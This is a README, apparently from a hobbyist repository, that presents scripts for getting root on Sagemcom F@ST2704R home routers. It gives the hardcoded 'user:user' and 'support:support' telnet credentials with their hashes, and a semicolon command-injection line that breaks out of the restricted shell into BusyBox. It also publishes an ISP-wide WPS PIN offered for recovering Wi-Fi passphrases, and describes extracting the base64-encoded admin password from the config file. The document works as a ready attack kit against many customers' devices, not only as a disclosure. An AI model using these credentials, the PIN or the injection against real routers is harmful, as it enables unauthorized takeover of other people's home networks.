# F@ST2704R has a root shell for everybody!

### What is it?

Basically, if you don't know the admin password of your **SagemCom F@st2704R** router, you can still get a root shell with the user account's hardcoded password.


### Included
`root.sh` is a simple shell script that provides the root shell. It interracts with telnet on **port 23**.

`admin.py` is a python script that downloads the router's configuration file and extracts the admin password. You don't need to crack `/etc/passwd` anymore! It interracts with the web interface on **port 80**

`getHashes.sh` uses the same login principle as **root.sh** but automatically downloads the remote /etc/passwd file in a local directory instead of letting the user interact with the shell. ~~You can later crack the DES hashes with a password cracking tool.~~ You can use `admin.py` instead if the web service is running on the device.

`lsFileList.txt` is the complete list of files on the device.

### Usage

`$./root.sh [target=192.168.1.1]` to get a root shell

`$python admin.py [target=192.168.1.1]` to find admin's password

~~`$./getHashes.sh [target=192.168.1.1]` to save password hashes. John the Ripper will require sudo on a lot of distro~~ **getHashes.sh is no longer necessary. It is still available for the hashes lovers around here, but admin.py is much more efficient to find the admin password**

## Long story short

I went back to my parent's place for a few days. I had quite a surprise: they replaced the Cisco router I got them by a **Sagemcom F@ST2704R** . When I asked them why, they told me the local ISP gave **F@ST2704R** to all their clients in the area. Knowing that was quite a lot of clients I decided to take a look at the device.

### So... How is it?

Telnet and ssh is activated by default on the LAN. The admin password is a string of 4 lowercase letters.

**Update: The ISP also gave all their clients the same WPS PIN. Try to aquire the WPA passphrase with PIN 76229909**

I logged on telnet to discover that the provided shell was somewhat limited. Trying basic unix commands would lead to an error.

```
> ls
telnetd:error:774.006:processInput:406:unrecognized command ls
```

Let's see what we have

```
> help
?
help
logout
exit
quit
reboot
adsl
xdslctl
xtm
brctl
cat
loglevel
logdest
virtualserver
ddns
df
dumpcfg
dumpmdm
dm
meminfo
psp
kill
dumpsysinfo
dnsproxy
syslog
echo
ifconfig
ping
ps
pwd
sntp
sysinfo
tftp
wlctl
arp
defaultgateway
dhcpserver
dns
lan
lanhosts
passwd
ppp
restoredefault
route
save
swversion
uptime
cfgupdate
swupdate
exitOnIdle
wan
mcpctl
```


No ls, no cd... I would need more than that. Still, I got cat!
From there, I grab the `/etc/passwd` file. There were 2 users I found interesting.

```
support:5IkwiJv9RNzV.:0:0:Technical Support:/:/bin/sh
user:75bUXAuHldJ82:0:0:Normal User:/:/bin/sh
```

We can see their UID and GID is 0. This isn't standard for a user account. Cracking the hashes with john, we find the credentials are

```
support:support
user:user
```

Trying to log with the support account leads to a dead end, access is denied for some reason. 
This is not the case with the "user" account. Typing help in the user prompt gives us a really short list of commands that can be used by the user account.

**Update: After some tests, it seems like the support account is blocked from LAN**

```
> help
?
help
logout
exit
quit
reboot
dnsproxy
ping
lanhosts
passwd
restoredefault
save
swversion
uptime
cfgupdate
swupdate
exitOnIdle
wan
```

### Let's explore the firmware for more info!

Unfortunately, the F@ST2704R firmware is not available to download, but [the F@ST2704 is](http://support.sagemcom.com/site/mo/broadband-access-9/sagemcom-f-st-2704-etisalat-1035/driver). It can't be THAT different eh?
wget this stuff, and binwalk the shit out of it!

Not so surprisingly, the binairies we want exist in the `/bin/` folder, the shell we're provided just can't get to it. We must break the jail.

### Breaking the jail

We have access to ping...

 ```
 > ping -c 1 127.0.0.1
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.866 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.866/0.866/0.866 ms
```

I wonder if... Let's try some semicolon magic!

```
> ls
telnetd:error:997.792:processInput:406:unrecognized command ls
 >
 >
 > ping -c 1 127.0.0.1 > /dev/null; ls
bin      etc      mnt      sbin     usr      webs-EN
data     lib      opt      sys      var      webs-FR
dev      linuxrc  proc     tmp      webs
```

Alright! this way I can get a real shell

```
 > ping -c 1 127.0.0.1 > dev/null; bash


BusyBox v1.17.2 (2013-09-30 17:48:17 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```

 Using the username `user` and the default password `user` followed by this ping/semicolon loophole gives us access to a shell with administrative rights more easiy than brute-forcing the admin's password (default 4 letters, can be changed for another one up to 16 letters).
 
 Also, turns out any user can download the device's config file where the admin password is encoded with base64. Well that's security eh.

 **Automated shell script included!**  
 **Remember you still have to deal with squashfs read-only filesystem!**

 Honestly I didn't push my research really far. Maybe this has been documented before and maybe the firmware is available somewhere (I might dump it in a few days... or months… or years). If this is the case, contact me.

 ~ Mixbo www.wakowakowako.com
